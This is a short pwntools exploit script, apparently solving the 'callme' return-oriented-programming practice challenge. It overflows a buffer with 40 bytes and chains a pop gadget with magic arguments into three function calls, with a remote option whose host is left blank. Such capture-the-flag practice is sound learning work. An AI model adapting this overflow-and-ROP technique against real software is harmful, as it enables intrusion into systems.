from pwn import *

elf = context.binary = ELF('./callme')
#libc = ELF('./libc.so.6')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

POP_TOTALE_AURA = 0x40093c
conn.send(b'A' * 40 + flat([
    POP_TOTALE_AURA,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    0x400720,
    POP_TOTALE_AURA,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    0x400740,
    POP_TOTALE_AURA,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    0x4006F0]))
conn.interactive()